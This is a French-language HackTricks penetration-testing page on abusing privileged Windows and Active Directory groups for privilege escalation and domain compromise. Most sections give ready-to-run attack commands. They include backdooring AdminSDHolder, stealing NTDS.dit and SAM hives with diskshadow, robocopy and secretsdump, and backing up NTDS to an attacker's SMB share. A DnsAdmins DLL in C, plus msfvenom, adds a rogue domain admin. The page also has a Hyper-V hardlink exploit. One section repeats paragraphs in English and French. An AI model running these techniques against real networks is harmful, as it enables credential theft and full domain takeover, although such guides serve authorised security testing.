# Groupes privilégiés

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Groupes connus avec des privilèges d'administration

* **Administrateurs**
* **Domain Admins**
* **Enterprise Admins**

Il existe d'autres adhésions de compte et privilèges de jeton d'accès qui peuvent également être utiles lors des évaluations de sécurité lors de la chaîne de plusieurs vecteurs d'attaque.

## Opérateurs de compte <a href="#account-operators" id="account-operators"></a>

* Permet de créer des comptes et des groupes non administrateurs sur le domaine
* Permet de se connecter localement au DC

Obtenir les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Notez l'appartenance de l'utilisateur "spotless":

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

Cependant, nous pouvons toujours ajouter de nouveaux utilisateurs:

![](../../.gitbook/assets/a2.png)

Ainsi que se connecter localement à DC01:

![](../../.gitbook/assets/a3.png)

## Groupe AdminSDHolder

La liste de contrôle d'accès (ACL) de l'objet **AdminSDHolder** est utilisée comme modèle pour **copier** les **permissions** vers **tous les "groupes protégés"** dans Active Directory et leurs membres. Les groupes protégés incluent des groupes privilégiés tels que Domain Admins, Administrateurs, Enterprise Admins et Schema Admins.\
Par défaut, l'ACL de ce groupe est copiée dans tous les "groupes protégés". Cela est fait pour éviter les modifications intentionnelles ou accidentelles de ces groupes critiques. Cependant, si un attaquant modifie l'ACL du groupe **AdminSDHolder**, par exemple en donnant des permissions complètes à un utilisateur régulier, cet utilisateur aura des permissions complètes sur tous les groupes à l'intérieur du groupe protégé (en une heure).\
Et si quelqu'un essaie de supprimer cet utilisateur des Domain Admins (par exemple) en une heure ou moins, l'utilisateur sera de retour dans le groupe.

Obtenir les **membres** du groupe:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
Ajoutez un utilisateur au groupe **AdminSDHolder** :
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
Vérifiez si l'utilisateur est membre du groupe **Domain Admins** :
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Si vous ne voulez pas attendre une heure, vous pouvez utiliser un script PS pour effectuer la restauration instantanément : [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**Plus d'informations sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **Corbeille AD**

Ce groupe vous donne la permission de lire les objets AD supprimés. Des informations intéressantes peuvent être trouvées ici :
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Accès au contrôleur de domaine

Notez comment nous ne pouvons pas accéder aux fichiers sur le DC avec l'appartenance actuelle :

![](../../.gitbook/assets/a4.png)

Cependant, si l'utilisateur appartient à `Server Operators` :

![](../../.gitbook/assets/a5.png)

L'histoire change :

![](../../.gitbook/assets/a6.png)

### Privilège d'élévation <a href="#backup-operators" id="backup-operators"></a>

Utilisez [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) ou `sc`, de Sysinternals, pour vérifier les autorisations sur un service.
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
Cela confirme que le groupe "Server Operators" a le droit d'accès [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), ce qui nous donne un contrôle total sur ce service.\
Vous pouvez exploiter ce service pour [**exécuter des commandes arbitraires**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path) et escalader les privilèges.

## Opérateurs de sauvegarde <a href="#backup-operators" id="backup-operators"></a>

Comme pour l'appartenance au groupe "Server Operators", nous pouvons **accéder au système de fichiers de DC01** si nous appartenons au groupe "Backup Operators".

Cela est dû au fait que ce groupe accorde à ses **membres** les privilèges [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) et [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5). Le privilège **SeBackupPrivilege** nous permet de **parcourir n'importe quel dossier et d'en lister** le contenu. Cela nous permettra de **copier un fichier à partir d'un dossier**, même si rien d'autre ne vous donne des autorisations. Cependant, pour exploiter ces autorisations et copier un fichier, le drapeau [**FILE_FLAG_BACKUP_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\* doit être utilisé. Par conséquent, des outils spéciaux sont nécessaires.

À cette fin, vous pouvez utiliser [**ces scripts**](https://github.com/giuliano108/SeBackupPrivilege)**.**

Obtenir les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **Attaque locale**

In a local attack, an attacker gains physical or remote access to a target machine and attempts to escalate privileges to gain administrative access. This can be achieved by exploiting vulnerabilities in the operating system or by manipulating user privileges.

Dans une attaque locale, un attaquant obtient un accès physique ou distant à une machine cible et tente d'escalader les privilèges pour obtenir un accès administratif. Cela peut être réalisé en exploitant des vulnérabilités du système d'exploitation ou en manipulant les privilèges utilisateur.

#### **Privileged Groups and Token Privileges**

#### **Groupes privilégiés et privilèges de jeton**

In Windows, privileged groups are groups that have special permissions and privileges. These groups include the Administrators group, which has full control over the system, and the Domain Admins group, which has administrative access to the entire domain.

Sous Windows, les groupes privilégiés sont des groupes qui possèdent des autorisations et des privilèges spéciaux. Ces groupes comprennent le groupe Administrateurs, qui a un contrôle total sur le système, et le groupe Domain Admins, qui a un accès administratif à l'ensemble du domaine.

Token privileges are a set of rights assigned to a user or process when they log in or start running. These privileges determine what actions a user or process can perform on the system. Some common token privileges include the "SeDebugPrivilege" privilege, which allows a user or process to debug other processes, and the "SeImpersonatePrivilege" privilege, which allows a user or process to impersonate other users.

Les privilèges de jeton sont un ensemble de droits attribués à un utilisateur ou à un processus lors de leur connexion ou de leur exécution. Ces privilèges déterminent les actions qu'un utilisateur ou un processus peut effectuer sur le système. Certains privilèges de jeton courants incluent le privilège "SeDebugPrivilege", qui permet à un utilisateur ou à un processus de déboguer d'autres processus, et le privilège "SeImpersonatePrivilege", qui permet à un utilisateur ou à un processus d'usurper l'identité d'autres utilisateurs.

By manipulating privileged groups and token privileges, an attacker can gain elevated privileges and perform actions that are normally restricted. This can include accessing sensitive data, modifying system configurations, or executing malicious code.

En manipulant les groupes privilégiés et les privilèges de jeton, un attaquant peut obtenir des privilèges élevés et effectuer des actions normalement restreintes. Cela peut inclure l'accès à des données sensibles, la modification des configurations système ou l'exécution de code malveillant.
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### Attaque AD

Par exemple, vous pouvez accéder directement au système de fichiers du contrôleur de domaine :

![](../../.gitbook/assets/a7.png)

Vous pouvez exploiter cet accès pour **voler** la base de données de l'annuaire actif **`NTDS.dit`** afin d'obtenir tous les **hachages NTLM** pour tous les utilisateurs et les objets informatiques du domaine.

#### Utilisation de diskshadow.exe pour extraire NTDS.dit

En utilisant [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), vous pouvez **créer une copie d'ombre** du lecteur **`C`** et par exemple sur le lecteur `F`. Ensuite, vous pouvez voler le fichier `NTDS.dit` à partir de cette copie d'ombre car il ne sera pas utilisé par le système :
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
Comme dans l'attaque locale, vous pouvez maintenant copier le fichier privilégié **`NTDS.dit`** :
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Une autre façon de copier des fichiers est d'utiliser [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**:**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
Ensuite, vous pouvez facilement **voler** le **SYSTEM** et le **SAM** :
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
Enfin, vous pouvez **obtenir tous les hachages** du fichier **`NTDS.dit`** :
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Utilisation de wbadmin.exe pour sauvegarder NTDS.dit

L'utilisation de wbadmin.exe est très similaire à diskshadow.exe. L'utilitaire wbadmin.exe est une ligne de commande intégrée à Windows, depuis Windows Vista/Server 2008.

Avant de l'utiliser, vous devez [**configurer le système de fichiers NTFS pour le serveur SMB**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801) sur la machine attaquante.

Une fois que vous avez terminé la configuration du serveur SMB, vous devez mettre en cache les informations d'identification SMB sur la machine cible :
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
Si aucune erreur n'est présente, utilisez wbadmin.exe pour l'exploiter :
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
Si cela réussit, cela sera déversé dans `C:\ntds.dit`.

[VIDÉO DE DÉMONSTRATION AVEC IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

Un utilisateur qui est membre du groupe **DNSAdmins** ou qui a des **privilèges d'écriture sur un** objet **serveur DNS** peut charger une **DLL arbitraire** avec des privilèges **SYSTEM** sur le **serveur DNS**.\
Cela est vraiment intéressant car les **contrôleurs de domaine** sont très fréquemment utilisés en tant que **serveurs DNS**.

Comme le montre ce \*\*\*\* [**article**](https://adsecurity.org/?p=4064), l'attaque suivante peut être effectuée lorsque DNS est exécuté sur un contrôleur de domaine (ce qui est très courant) :

* La gestion DNS est effectuée via RPC
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) nous permet de **charger** une DLL personnalisée sans **vérification** du chemin de la DLL. Cela peut être fait avec l'outil `dnscmd` depuis la ligne de commande
* Lorsqu'un membre du groupe **`DnsAdmins`** exécute la commande **`dnscmd`** ci-dessous, la clé de registre `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` est renseignée
* Lorsque le **service DNS est redémarré**, la **DLL** dans ce chemin sera **chargée** (c'est-à-dire un partage réseau auquel le compte machine du contrôleur de domaine peut accéder)
* Un attaquant peut charger une **DLL personnalisée pour obtenir un shell inversé** ou même charger un outil tel que Mimikatz en tant que DLL pour extraire des informations d'identification.

Obtenir les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Exécuter une DLL arbitraire

Ensuite, si vous avez un utilisateur dans le groupe **DNSAdmins**, vous pouvez faire en sorte que le serveur DNS charge une DLL arbitraire avec les privilèges **SYSTEM** (le service DNS s'exécute en tant que `NT AUTHORITY\SYSTEM`). Vous pouvez faire en sorte que le serveur DNS charge un fichier DLL **local ou distant** (partagé via SMB) en exécutant :
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
Un exemple de DLL valide peut être trouvé sur [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). Je modifierais le code de la fonction `DnsPluginInitialize` comme suit :
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
Ou vous pouvez générer une dll en utilisant msfvenom:
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Donc, lorsque le service DNS démarre ou redémarre, un nouvel utilisateur sera créé.

Même si vous avez un utilisateur dans le groupe DNSAdmin, **par défaut, vous ne pouvez pas arrêter et redémarrer le service DNS.** Mais vous pouvez toujours essayer de le faire :
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**En savoir plus sur cette élévation de privilèges sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

Comme expliqué dans ce [**post**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), il est également possible d'utiliser [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) du créateur de l'outil `Mimikatz` pour obtenir l'exécution de commandes en **modifiant** le fichier [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) pour exécuter une **ligne de commande inversée** ou une autre commande de notre choix.

### Enregistrement WPAD pour MitM

Une autre façon d'**abuser des privilèges du groupe DnsAdmins** est de créer un **enregistrement WPAD**. L'appartenance à ce groupe nous donne le droit de [désactiver la sécurité de blocage des requêtes globales](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), qui bloque cette attaque par défaut. Windows Server 2008 a introduit pour la première fois la possibilité d'ajouter une liste de blocage des requêtes globales sur un serveur DNS. Par défaut, le protocole Web Proxy Automatic Discovery Protocol (WPAD) et le protocole Intra-site Automatic Tunnel Addressing Protocol (ISATAP) sont sur la liste de blocage des requêtes globales. Ces protocoles sont assez vulnérables aux détournements, et n'importe quel utilisateur de domaine peut créer un objet d'ordinateur ou un enregistrement DNS contenant ces noms.

Après avoir **désactivé la liste de blocage des requêtes** globales et créé un **enregistrement WPAD**, **chaque machine** exécutant WPAD avec les paramètres par défaut aura son **trafic acheminé via notre machine d'attaque**. Nous pourrions utiliser un outil tel que \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **ou** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **pour effectuer un détournement de trafic**, et tenter de capturer des hachages de mots de passe et de les casser hors ligne ou d'effectuer une attaque SMBRelay.

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Lecteurs de journaux d'événements

Les membres du groupe [**Event Log Readers**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* ont **l'autorisation d'accéder aux journaux d'événements** générés (comme les journaux de création de nouveaux processus). Dans les journaux, des **informations sensibles** peuvent être trouvées. Voyons comment visualiser les journaux :
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Permissions d'échange Windows

Les membres sont autorisés à **écrire un DACL sur l'objet de domaine**. Un attaquant pourrait exploiter cela pour **accorder à un utilisateur** des privilèges [**DCSync**](dcsync.md).\
Si Microsoft Exchange est installé dans l'environnement AD, il est courant de trouver des comptes d'utilisateurs et même des ordinateurs en tant que membres de ce groupe.

Ce [**repo GitHub**](https://github.com/gdedrouas/Exchange-AD-Privesc) explique quelques **techniques** pour **escalader les privilèges** en exploitant les permissions de ce groupe.
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administrateurs Hyper-V

Le groupe [**Administrateurs Hyper-V**](https://docs.microsoft.com/fr-fr/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) a un accès complet à toutes les [fonctionnalités Hyper-V](https://docs.microsoft.com/fr-fr/windows-server/manage/windows-admin-center/use/manage-virtual-machines). Si les **Contrôleurs de domaine** ont été **virtualisés**, alors les **administrateurs de virtualisation** doivent être considérés comme des **Administrateurs de domaine**. Ils pourraient facilement **créer un clone du Contrôleur de domaine en direct** et **monter** le **disque** virtuel hors ligne pour obtenir le fichier **`NTDS.dit`** et extraire les hachages de mots de passe NTLM de tous les utilisateurs du domaine.

Il est également bien documenté sur ce [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) que lors de la **suppression** d'une machine virtuelle, `vmms.exe` tente de **restaurer les autorisations de fichier d'origine** sur le fichier **`.vhdx`** correspondant et le fait en tant que `NT AUTHORITY\SYSTEM`, sans se faire passer pour l'utilisateur. Nous pouvons **supprimer le fichier `.vhdx`** et **créer** un **lien physique** natif pour pointer ce fichier vers un fichier **SYSTEM protégé**, et vous obtiendrez des autorisations complètes.

Si le système d'exploitation est vulnérable à [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) ou [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), nous pouvons exploiter cela pour obtenir des privilèges SYSTEM. Sinon, nous pouvons essayer de **profiter d'une application sur le serveur qui a installé un service s'exécutant dans le contexte de SYSTEM**, qui peut être démarré par des utilisateurs non privilégiés.

### **Exemple d'exploitation**

Un exemple de cela est **Firefox**, qui installe le **`Mozilla Maintenance Service`**. Nous pouvons mettre à jour [cette exploitation](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (une preuve de concept pour le lien physique NT) pour accorder à notre utilisateur actuel des autorisations complètes sur le fichier ci-dessous :
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Prendre possession du fichier**

Après avoir exécuté le script PowerShell, nous devrions avoir **un contrôle total sur ce fichier et pouvoir en prendre possession**.
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Démarrage du service de maintenance Mozilla**

Ensuite, nous pouvons remplacer ce fichier par un **`maintenanceservice.exe` malveillant**, **démarrer** le service de maintenance et obtenir l'exécution de commandes en tant que SYSTEM.
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
Ce vecteur a été atténué par les mises à jour de sécurité de Windows de mars 2020, qui ont modifié le comportement lié aux liens physiques.
{% endhint %}

## Gestion de l'organisation

Ce groupe est également présent dans les environnements avec **Microsoft Exchange** installé.\
Les membres de ce groupe peuvent **accéder** aux **boîtes aux lettres** de **tous** les utilisateurs du domaine.\
Ce groupe a également un **contrôle total** de l'OU appelée `Groupes de sécurité Microsoft Exchange`, qui contient le groupe [**`Permissions Windows Exchange`**](privileged-groups-and-token-privileges.md#permissions-windows-exchange) \*\*\*\* (suivez le lien pour voir comment abuser de ce groupe pour une élévation de privilèges).

## Opérateurs d'impression

Les membres de ce groupe se voient accorder :

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **Se connecter localement à un contrôleur de domaine** et l'éteindre
* Des autorisations pour **gérer**, créer, partager et supprimer des **imprimantes connectées à un contrôleur de domaine**

{% hint style="warning" %}
Si la commande `whoami /priv` ne montre pas le **`SeLoadDriverPrivilege`** depuis un contexte non élevé, vous devez contourner l'UAC.
{% endhint %}

Obtenir les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Consultez cette page pour savoir comment exploiter le privilège SeLoadDriverPrivilege pour une élévation de privilèges :

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## Utilisateurs du Bureau à distance

Les membres de ce groupe peuvent accéder aux PC via RDP.\
Obtenez les **membres** du groupe :
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Plus d'informations sur **RDP**:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## Utilisateurs de gestion à distance

Les membres de ce groupe peuvent accéder aux PC via **WinRM**.
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Plus d'informations sur **WinRM**:

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## Opérateurs de serveur <a href="#server-operators" id="server-operators"></a>

Cette adhésion permet aux utilisateurs de configurer les contrôleurs de domaine avec les privilèges suivants:

* Autoriser la connexion en local
* Sauvegarder les fichiers et répertoires
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) et [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* Modifier l'heure système
* Modifier le fuseau horaire
* Forcer l'arrêt à partir d'un système distant
* Restaurer les fichiers et répertoires
* Arrêter le système
* Contrôler les services locaux

Obtenir les **membres** du groupe:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Références <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
